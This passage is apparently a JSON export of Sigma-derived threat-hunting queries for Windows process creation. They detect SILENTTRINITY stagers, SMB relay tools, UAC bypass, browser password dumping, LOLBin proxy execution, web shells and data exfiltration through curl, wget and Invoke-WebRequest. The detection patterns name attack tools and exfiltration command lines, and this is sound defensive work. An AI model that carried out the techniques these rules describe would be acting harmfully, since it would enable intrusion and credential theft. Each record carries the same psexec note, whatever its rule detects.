            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects SILENTTRINITY stager use via PE metadata",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "HackTool - SILENTTRINITY Stager Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.displayName contains \"st2stager\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1165
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Attackers can use print.exe for remote file copy",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Abusing Print Executable",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\print.exe\" and tgt.process.cmdline contains \"print\" and (tgt.process.cmdline contains \"/D\" and tgt.process.cmdline contains \".exe\")) and (not tgt.process.cmdline contains \"print.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1166
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Plink tunnel port forwarding to a local port",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572",
                "t1021"
            ],
            "name": "Suspicious Plink Port Forwarding",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"Command-line SSH, Telnet, and Rlogin client\" and tgt.process.cmdline contains \" -R \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1167
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021",
                "t1570",
                "t1569"
            ],
            "name": "Rundll32 Execution Without Parameters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline in (\"rundll32.exe\",\"rundll32\"))) | columns ComputerName,SubjectUserName,tgt.process.cmdline,tgt.process.image.path,src.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1168
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects unusual parent or children of the wab.exe (Windows Contacts) and Wabmig.exe (Microsoft Address Book Import Tool) processes as seen being used with bumblebee activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Wab/Wabmig Unusual Parent Or Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\WmiPrvSE.exe\" or src.process.image.path contains \"\\svchost.exe\" or src.process.image.path contains \"\\dllhost.exe\") and (tgt.process.image.path contains \"\\wab.exe\" or tgt.process.image.path contains \"\\wabmig.exe\")) or (src.process.image.path contains \"\\wab.exe\" or src.process.image.path contains \"\\wabmig.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1169
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of WebBrowserPassView.exe. A password recovery tool that reveals the passwords stored by the following Web browsers, Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1555"
            ],
            "name": "PUA - WebBrowserPassView Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName=\"Web Browser Password Viewer\" or tgt.process.image.path contains \"\\WebBrowserPassView.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1170
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects different hacktools used for relay attacks on Windows for privilege escalation",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1557"
            ],
            "name": "Potential SMB Relay Attack Tool Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"PetitPotam\" or tgt.process.image.path contains \"RottenPotato\" or tgt.process.image.path contains \"HotPotato\" or tgt.process.image.path contains \"JuicyPotato\" or tgt.process.image.path contains \"\\just_dce_\" or tgt.process.image.path contains \"Juicy Potato\" or tgt.process.image.path contains \"\\temp\\rot.exe\" or tgt.process.image.path contains \"\\Potato.exe\" or tgt.process.image.path contains \"\\SpoolSample.exe\" or tgt.process.image.path contains \"\\Responder.exe\" or tgt.process.image.path contains \"\\smbrelayx\" or tgt.process.image.path contains \"\\ntlmrelayx\" or tgt.process.image.path contains \"\\LocalPotato\") or (tgt.process.cmdline contains \"Invoke-Tater\" or tgt.process.cmdline contains \" smbrelay\" or tgt.process.cmdline contains \" ntlmrelay\" or tgt.process.cmdline contains \"cme smb \" or tgt.process.cmdline contains \" /ntlm:NTLMhash \" or tgt.process.cmdline contains \"Invoke-PetitPotam\" or tgt.process.cmdline=\"*.exe -t * -p *\") or (tgt.process.cmdline contains \".exe -c \\\"{\" and tgt.process.cmdline contains \"}\\\" -z\")) and (not (tgt.process.image.path contains \"HotPotatoes6\" or tgt.process.image.path contains \"HotPotatoes7\" or tgt.process.image.path contains \"HotPotatoes \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1171
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass via Windows Firewall Snap-In Hijack",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\mmc.exe\" and src.process.cmdline contains \"WF.msc\") and (not tgt.process.image.path contains \"\\WerFault.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1172
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes of the Add-In deployment cache updating utility (AddInutil.exe) which could be a sign of potential abuse of the binary to proxy execution via a custom Addins.Store payload.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Child Process Of AddinUtil.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\addinutil.exe\" and (not (tgt.process.image.path contains \":\\Windows\\System32\\conhost.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\werfault.exe\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\werfault.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1173
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of various CLI utilities exfiltrating data via web requests",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Potential Data Exfiltration Activity Via CommandLine Tools",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\cmd.exe\") and (tgt.process.cmdline contains \"Invoke-WebRequest\" or tgt.process.cmdline contains \"iwr \" or tgt.process.cmdline contains \"wget \" or tgt.process.cmdline contains \"curl \") and (tgt.process.cmdline contains \" -ur\" and tgt.process.cmdline contains \" -me\" and tgt.process.cmdline contains \" -b\" and tgt.process.cmdline contains \" POST \")) or ((tgt.process.image.path contains \"\\curl.exe\" and tgt.process.cmdline contains \"--ur\") and (tgt.process.cmdline contains \" -d \" or tgt.process.cmdline contains \" --data \")) or (tgt.process.image.path contains \"\\wget.exe\" and (tgt.process.cmdline contains \"--post-data\" or tgt.process.cmdline contains \"--post-file\"))) and ((tgt.process.cmdline contains \"Get-Content\" or tgt.process.cmdline contains \"GetBytes\" or tgt.process.cmdline contains \"hostname\" or tgt.process.cmdline contains \"ifconfig\" or tgt.process.cmdline contains \"ipconfig\" or tgt.process.cmdline contains \"net view\" or tgt.process.cmdline contains \"netstat\" or tgt.process.cmdline contains \"nltest\" or tgt.process.cmdline contains \"qprocess\" or tgt.process.cmdline contains \"sc query\" or tgt.process.cmdline contains \"systeminfo\" or tgt.process.cmdline contains \"tasklist\" or tgt.process.cmdline contains \"ToBase64String\" or tgt.process.cmdline contains \"whoami\") or (tgt.process.cmdline contains \"type \" and tgt.process.cmdline contains \" > \" and tgt.process.cmdline contains \" C:\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1174
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects using register-cimprovider.exe to execute arbitrary dll file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "DLL Execution Via Register-cimprovider.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\register-cimprovider.exe\" and (tgt.process.cmdline contains \"-path\" and tgt.process.cmdline contains \"dll\"))) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1175
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of the \"Squirrel.exe\" binary to execute arbitrary processes. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Process Proxy Execution Via Squirrel.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\squirrel.exe\" or tgt.process.image.path contains \"\\update.exe\") and (tgt.process.cmdline contains \"--processStart\" or tgt.process.cmdline contains \"--processStartAndWait\" or tgt.process.cmdline contains \"--createShortcut\")) and (not ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Discord\\Update.exe\" and tgt.process.cmdline contains \" --processStart\" and tgt.process.cmdline contains \"Discord.exe\") or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\GitHubDesktop\\Update.exe\" and tgt.process.cmdline contains \"GitHubDesktop.exe\") and (tgt.process.cmdline contains \"--createShortcut\" or tgt.process.cmdline contains \"--processStartAndWait\")) or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Microsoft\\Teams\\Update.exe\" and tgt.process.cmdline contains \"Teams.exe\") and (tgt.process.cmdline contains \"--processStart\" or tgt.process.cmdline contains \"--createShortcut\")) or ((tgt.process.cmdline contains \":\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\yammerdesktop\\Update.exe\" and tgt.process.cmdline contains \"Yammer.exe\") and (tgt.process.cmdline contains \"--processStart\" or tgt.process.cmdline contains \"--createShortcut\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1176
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a Chromium based browser process with the 'load-extension' flag to start a instance with a custom extension",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1176"
            ],
            "name": "Chromium Browser Instance Executed With Custom Extension",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\brave.exe\" or tgt.process.image.path contains \"\\chrome.exe\" or tgt.process.image.path contains \"\\msedge.exe\" or tgt.process.image.path contains \"\\opera.exe\" or tgt.process.image.path contains \"\\vivaldi.exe\") and tgt.process.cmdline contains \"--load-extension=\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1177
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects an executable in the users directory started from one of the Microsoft Office suite applications (Word, Excel, PowerPoint, Publisher, Visio)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1204"
            ],
            "name": "Suspicious Binary In User Directory Spawned From Office Application",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\WINWORD.EXE\" or src.process.image.path contains \"\\EXCEL.EXE\" or src.process.image.path contains \"\\POWERPNT.exe\" or src.process.image.path contains \"\\MSPUB.exe\" or src.process.image.path contains \"\\VISIO.exe\" or src.process.image.path contains \"\\MSACCESS.exe\" or src.process.image.path contains \"\\EQNEDT32.exe\") and tgt.process.image.path contains \"C:\\users\\\" and tgt.process.image.path contains \".exe\") and (not tgt.process.image.path contains \"\\Teams.exe\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1178
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential web shell execution from the ScreenConnect server process.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1190"
            ],
            "name": "Remote Access Tool - ScreenConnect Server Web Shell Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\ScreenConnect.Service.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\csc.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1179
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of \"forfiles\" from a non-default location, in order to potentially spawn a custom \"cmd.exe\" from the current working directory.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Forfiles.EXE Child Process Masquerading",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.cmdline contains \".exe\" or src.process.cmdline contains \".exe\\\"\") and tgt.process.image.path contains \"\\cmd.exe\" and tgt.process.cmdline contains \"/c echo \\\"\") and (not ((src.process.image.path contains \":\\Windows\\System32\\\" or src.process.image.path contains \":\\Windows\\SysWOW64\\\") and src.process.image.path contains \"\\forfiles.exe\" and (tgt.process.image.path contains \":\\Windows\\System32\\\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\\") and tgt.process.image.path contains \"\\cmd.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1180
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
